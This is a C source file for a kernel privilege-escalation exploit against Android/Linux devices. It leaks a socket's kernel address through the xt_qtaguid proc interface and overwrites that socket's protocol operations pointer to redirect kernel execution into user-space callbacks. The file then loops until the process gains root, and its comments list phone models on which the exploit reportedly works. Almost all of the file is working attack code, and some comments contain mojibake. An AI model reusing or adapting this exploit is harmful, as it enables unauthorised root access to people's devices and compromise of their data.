#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <linux/socket.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include "log.h"
#include "becomeRoot.h"

/*
struct sock_common {
158	/ skc_daddr and skc_rcv_saddr must be grouped on a 8 bytes aligned
159	  address on 64bit arches : cf INET_MATCH() and INET_TW_MATCH()
160	 /
161	union {----------------------------------------8Byte
162		__addrpair	skc_addrpair;
163		struct {
164			__be32	skc_daddr;
165			__be32	skc_rcv_saddr;
166		};
167	};
168	union  {--------------------------------------4Byte
169		unsigned int	skc_hash;
170		__u16		skc_u16hashes[2];
171	};
172	/ skc_dport && skc_num must be grouped as well /
173	union {---------------------------------------4Byte
174		__portpair	skc_portpair;
175		struct {
176			__be16	skc_dport;
177			__u16	skc_num;
178		};
179	};
180
181	unsigned short		skc_family;--------------2Byte
182	volatile unsigned char	skc_state;-----------1Byte
183	unsigned char		skc_reuse:4;-------------1Byte
184	unsigned char		skc_reuseport:4;
185	int			skc_bound_dev_if;----------------4Byte
186	union {2¸öÖ¸Õë-------------------------------2*4=8Byte
187		struct hlist_node	skc_bind_node;
188		struct hlist_nulls_node skc_portaddr_node;
189	};
190	struct proto		*skc_prot;
#ifdef CONFIG_NET_NS
192	struct net	 	*skc_net;
193#endif
194	/
195	 * fields between dontcopy_begin/dontcopy_end
196	 * are not copied in sock_copy()
197	 /
198	/ private: /
199	int			skc_dontcopy_begin[0];
200	/ public: /
201	union {
202		struct hlist_node	skc_node;
203		struct hlist_nulls_node skc_nulls_node;
204	};
205	int			skc_tx_queue_mapping;
206	atomic_t		skc_refcnt;
207	/ private: /
208	int                     skc_dontcopy_end[0];
209	/ public: /

struct proto {
886	void			(*close)(struct sock *sk,
887					long timeout);
888	int			(*connect)(struct sock *sk,
889					struct sockaddr *uaddr,
890					int addr_len);
891	int			(*disconnect)(struct sock *sk, int flags);
892
893	struct sock *		(*accept)(struct sock *sk, int flags, int *err);
894
895	int			(*ioctl)(struct sock *sk, int cmd,
896					 unsigned long arg);
897	int			(*init)(struct sock *sk);
898	void			(*destroy)(struct sock *sk);
899	void			(*shutdown)(struct sock *sk, int how);
900	int			(*setsockopt)(struct sock *sk, int level,
901					int optname, char __user *optval,
902					unsigned int optlen);
903	int			(*getsockopt)(struct sock *sk, int level,
904					int optname, char __user *optval,
905					int __user *option);
906#ifdef CONFIG_COMPAT
907	int			(*compat_setsockopt)(struct sock *sk,
908					int level,
909					int optname, char __user *optval,
910					unsigned int optlen);
911	int			(*compat_getsockopt)(struct sock *sk,
912					int level,
913					int optname, char __user *optval,
914					int __user *option);
915	int			(*compat_ioctl)(struct sock *sk,
916					unsigned int cmd, unsigned long arg);
917#endif
918	int			(*sendmsg)(struct kiocb *iocb, struct sock *sk,
919					   struct msghdr *msg, size_t len);
920	int			(*recvmsg)(struct kiocb *iocb, struct sock *sk,
921					   struct msghdr *msg,
922					   size_t len, int noblock, int flags,
923					   int *addr_len);
924	int			(*sendpage)(struct sock *sk, struct page *page,
925					int offset, size_t size, int flags);
926	int			(*bind)(struct sock *sk,
927					struct sockaddr *uaddr, int addr_len);
928
929	int			(*backlog_rcv) (struct sock *sk,
930						struct sk_buff *skb);
931
932	void		(*release_cb)(struct sock *sk);
933	void		(*mtu_reduced)(struct sock *sk);
934
935	/ Keeping track of sk's, looking them up, and port selection methods. /
936	void			(*hash)(struct sock *sk);
937	void			(*unhash)(struct sock *sk);
938	void			(*rehash)(struct sock *sk);
939	int			(*get_port)(struct sock *sk, unsigned short snum);
940	void			(*clear_sk)(struct sock *sk, int size);
941
942	/ Keeping track of sockets in use /
943#ifdef CONFIG_PROC_FS
944	unsigned int		inuse_idx;
945#endif
946
947	/ Memory pressure /
948	void			(*enter_memory_pressure)(struct sock *sk);
949	atomic_long_t		*memory_allocated;	/ Current allocated memory. /
950	struct percpu_counter	*sockets_allocated;	/ Current number of sockets. /
951	/
952	 * Pressure flag: try to collapse.
953	 * Technical note: it is used by multiple contexts non atomically.
954	 * All the __sk_mem_schedule() is of this nature: accounting
955	 * is strict, actions are advisory and have some latency.
956	 /
957	int			*memory_pressure;
958	long			*sysctl_mem;
959	int			*sysctl_wmem;
960	int			*sysctl_rmem;
961	int			max_header;
962	bool			no_autobind;
963
964	struct kmem_cache	*slab;
965	unsigned int		obj_size;
966	int			slab_flags;
967
968	struct percpu_counter	*orphan_count;
969
970	struct request_sock_ops	*rsk_prot;
971	struct timewait_sock_ops *twsk_prot;
972
973	union {
974		struct inet_hashinfo	*hashinfo;
975		struct udp_table	*udp_table;
976		struct raw_hashinfo	*raw_hash;
977	} h;
978
979	struct module		*owner;
980
981	char			name[32];
982
983	struct list_head	node;
984#ifdef SOCK_REFCNT_DEBUG
985	atomic_t		socks;
986#endif
987#ifdef CONFIG_MEMCG_KMEM
988	/
989	 * cgroup specific init/deinit functions. Called once for all
990	 * protocols that implement it, from cgroups populate function.
991	 * This function has to setup any files the protocol want to
992	 * appear in the kmem cgroup filesystem.
993	 /
994	int			(*init_cgroup)(struct mem_cgroup *memcg,
995					       struct cgroup_subsys *ss);
996	void			(*destroy_cgroup)(struct mem_cgroup *memcg);
997	struct cg_proto		*(*proto_cgroup)(struct mem_cgroup *memcg);
998#endif
999};
*/
#define CMD_TEST_INSTALLED  0x100
#define CMD_ROOT_DEVICE     0x101

#define CALLBACK_TESTINSTALLED_VALUE 0x1234
#define CALLBACK_ROOTDEVICE_VALUE 0x5678
#define CALLBACK_NOT_MATCH 0x0

#define TARGET_ADDR_FIX2_BASE (void*)0x66880000
#define TARGET_ADDR_FIX2_SIZE (0x1000)
#define TARGET_ADDR_FIX_BASE (void*)0x66660000
#define TARGET_ADDR_DIFF  (0x1000)
#define TARGET_ADDR_FIX(addr) (void*)((char*)addr + TARGET_ADDR_DIFF)
#define TARGET_ADDR_SIZE    (0x3000)

int poc(size_t addr, int size, unsigned long value, int (*test_func)());

struct callback_struct{
    int callback_func_cmd;
    int callback_func_ret;
};

int socket_fd_exploit = -1;
struct callback_struct g_callback_struct={0};

unsigned long int do_kptr_restrict(){
    char buff[1024];
    struct sockaddr_in sock_addr;
    pid_t pid;
    int ctrlFd;
    uid_t uid;
    int len;
    void* mmap_addr0; 
    int ret;
    char* ptr, *ptr_start; 
    
    socket_fd_exploit = socket(PF_INET/*2*/, SOCK_DGRAM/*2*/, IPPROTO_ICMP/*1*/);// = 14
    
    memset(&sock_addr, 0, sizeof(sock_addr));
    sock_addr.sin_family = AF_INET;/*2*/
    sock_addr.sin_port = 0;
    sock_addr.sin_addr.s_addr = 0;
    ret = connect(socket_fd_exploit, (struct sockaddr*)&sock_addr, sizeof(sock_addr));
    if(-1 == ret){
        LOGE("[-] <do_kptr_restrict> connect(...)=%d failed", ret);
        return 0;
    }
    
    pid = getpid();// = 0x1352 = 4946
    snprintf(buff, 0x100, "/proc/%d/net/xt_qtaguid/ctrl", pid); ///proc/4946/net/xt_qtaguid/ctrl
    
    ctrlFd = open(buff, O_RDWR/*2*/);
    if(-1 == ctrlFd){
        LOGE("[-] <do_kptr_restrict> ctrlFd=%d\n", ctrlFd); //=0xF=15
        return 0;
    }
    
    uid = getuid(); //=0x7d0=2000
    snprintf(buff, 0x100, "d %lu %u", (long unsigned int)0, uid);
    len = strlen(buff);
    write(ctrlFd, buff, len);
    
    uid = getuid();
    snprintf(buff, 0x100, "t %d %llu %u", socket_fd_exploit, 0x133700000000L, uid); // t 14 21126944129024 2000
    len = strlen(buff);
    write(ctrlFd, buff, len);
    
    mmap_addr0 = (void*)mmap(NULL, 0x11000/*0x11000*/, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);//=0xB6EF8008
    
    /*
    sock=eaea5f80 tag=0x1337000007d0 (uid=2000) pid=4946 f_count=2\n
     events: sockets_tagged=46 sockets_untagged=44 counter_set_changes=16 delete_cmds=3
     iface_events=184 match_calls=3067399 match_calls_prepost=1227137 match_found_sk=1227047
     match_found_sk_in_ct=613116 match_found_no_sk_in_ct=99 match_no_sk=173395 match_no_sk_file=466\n
    */
    ret = read(ctrlFd, mmap_addr0, 0x00010000);
    if(-1 == ret){
        LOGE("[-] <do_kptr_restrict> failed to read");
        return 0;
    }
    *((char*)mmap_addr0+ret) = 0;
    LOGD("[+] <do_kptr_restrict> read=%s", (char*)mmap_addr0);
    
    ptr = strstr((char*)mmap_addr0, "sock=");
    if(NULL == ptr){
        LOGE("[-] <do_kptr_restrict> failed to find ptr");
        return 0;
    }
    ptr_start = ptr = ptr+strlen("sock=");
    while( *ptr != '\0' && *ptr != ' ' && *ptr != '\t' && ptr-ptr_start<=10){
        ptr++;
        continue;
    }
    *ptr = '\0';
    ret = strtoul(ptr_start, NULL, 16);
    
    
    uid = getuid();
    snprintf(buff, 0x100, "d %lu %u", (long unsigned int)0, uid);//=d 0 2000
    len = strlen(buff);
    
    write(ctrlFd, buff, 0);
    
    munmap(mmap_addr0, 0x11000);
    
    return ret;
}

int callback_func(){
    if(CMD_TEST_INSTALLED==g_callback_struct.callback_func_cmd){
        g_callback_struct.callback_func_ret = CALLBACK_TESTINSTALLED_VALUE;
        return CALLBACK_TESTINSTALLED_VALUE;
    }else if(CMD_ROOT_DEVICE==g_callback_struct.callback_func_cmd){
        g_callback_struct.callback_func_ret = CALLBACK_ROOTDEVICE_VALUE;
        callback();
        return CALLBACK_ROOTDEVICE_VALUE;
    }
    return CALLBACK_NOT_MATCH;
}

void* callback_funcs[]={
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
    (void*)callback_func, (void*)callback_func, (void*)callback_func, (void*)callback_func,
};

static int trigger_flaw(){
    unsigned int sockOptValue = 0;
	int sockOptLen = 4;
    int ret;
    struct sockaddr_in sock_addr;
    
    
    //ret = getsockopt(socket_fd_exploit, 1/*SOL_SOCKET*/, 0xC/*SO_PRIORITY*/, &sockOptValue, &sockOptLen);
    //if(0 != ret || 0!= sockOptValue) { LOGD("ret=%d, %x",ret, sockOptValue);}
    
    /*
    memset(&sock_addr, 0, sizeof(sock_addr));
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = 0;
    sock_addr.sin_addr.s_addr = 0;
    ret = connect(socket_fd_exploit, (struct sockaddr*)&sock_addr, sizeof(sock_addr));
    */
    ret = ioctl(socket_fd_exploit, 0xABCD);
    
    
    return ret;
}

void* mmap_target(){
    void* mmap_addr;
    void* mmap_addr2;
    int i;
    mmap_addr = (void*)mmap(TARGET_ADDR_FIX_BASE, TARGET_ADDR_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    mmap_addr2 = (void*)mmap(TARGET_ADDR_FIX2_BASE, TARGET_ADDR_FIX2_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if( NULL == mmap_addr || TARGET_ADDR_FIX_BASE != mmap_addr ){
        LOGE("[-] <exploit> failed to prepare target addr");
        return NULL;
    }
    if( NULL == mmap_addr2 || TARGET_ADDR_FIX2_BASE != mmap_addr2 ){
        LOGE("[-] <exploit> failed to prepare target addr2");
        return NULL;
    }
    memset(mmap_addr2, 0xA0, TARGET_ADDR_FIX2_SIZE);
    for(i=0; i<TARGET_ADDR_SIZE/sizeof(void*); i++){
        *((unsigned long*)mmap_addr + i) = (unsigned long)mmap_addr2;
    }
    //memset(mmap_addr, 0xB0, TARGET_ADDR_SIZE);
    memcpy(TARGET_ADDR_FIX(mmap_addr), callback_funcs, sizeof(callback_funcs));
    return mmap_addr;
}
void munmap_target(void* addr){
    munmap(addr, TARGET_ADDR_SIZE);
}
void* mmap_target2(){
    void* mmap_addr;
    mmap_addr = malloc(TARGET_ADDR_SIZE);
    if( NULL == mmap_addr ){
        return NULL;
    }
    memset(mmap_addr, 0xB0, TARGET_ADDR_SIZE);
    memcpy(TARGET_ADDR_FIX(mmap_addr), callback_funcs, sizeof(callback_funcs));
    LOGD("[+] <mmap_target2>********mmap_addr=%p", mmap_addr);
    return mmap_addr;
}
void munmap_target2(void* addr){
    free(addr);
}

int test_func(){
    int ret ;
    void* mmap_addr;
    
    ret = trigger_flaw();
    
    if(ret == CALLBACK_TESTINSTALLED_VALUE){
        return 0;
    }else{
        return -1;
    }
}

int exploit(){
    unsigned long addr = 0;
    void* mmap_addr;
    int i;
    
    mmap_addr = mmap_target();
    if(NULL == mmap_addr){
        LOGE("[-] <test_func> failed to mmap_target");
        return -1;
    }
    LOGD("[+] <exploit> mmap_addr=%p, callback_funcs=%p, sizeof=%d, callback_func=%p", mmap_addr, callback_funcs, sizeof(callback_funcs)/sizeof(callback_funcs[0]), callback_func);
    
    
    if( 0 == (addr = do_kptr_restrict()) || addr <= 0xC0008000){
        LOGE("[-] <exploit> failed to do_kptr_restrict");
        return -1;
    } 
    LOGD("[+] <exploit> sock addr = %lx", addr);
    /*
    ³É¹¦:
        nexus(3.4.0):28 oppo_r7(3.10.48):32 vivo_y23L(3.10.28):32 mx4_pro(3.10.9):32
    
        mx4(3.10.61):32  XT1079(3.4.42):36 Coolpad_8297-T01(3.10.28):32  SM-G920(unknow):32
        SM-G7106: 36
    */
    addr = addr + 28;
    
    for(i=0; i<10; i++){
        LOGD("[+] <exploit> ******try times : %d******", i);
        g_callback_struct.callback_func_cmd = CMD_TEST_INSTALLED;
        g_callback_struct.callback_func_ret = 0;
        poc((size_t)addr, 4, (unsigned long)TARGET_ADDR_FIX(mmap_addr), test_func);
        
        if( CALLBACK_TESTINSTALLED_VALUE != g_callback_struct.callback_func_ret ){
            LOGD("[-] <exploit> failed poc ,ret=%x", g_callback_struct.callback_func_ret); 
        }else{
            LOGD("[+] <exploit> test ok");
            szSELinux[0] = 'y';
            initProcessSt();
            
            g_callback_struct.callback_func_cmd = CMD_ROOT_DEVICE;
            g_callback_struct.callback_func_ret = 0;
            test_func();  
        }  
        LOGD("[+] <exploit> uid=%d", getuid());
        if(0 == getuid()){
            break;
        }
    }
    //ÉÆºó 
    close(socket_fd_exploit);
    munmap_target(mmap_addr);
    
    return getuid();
}
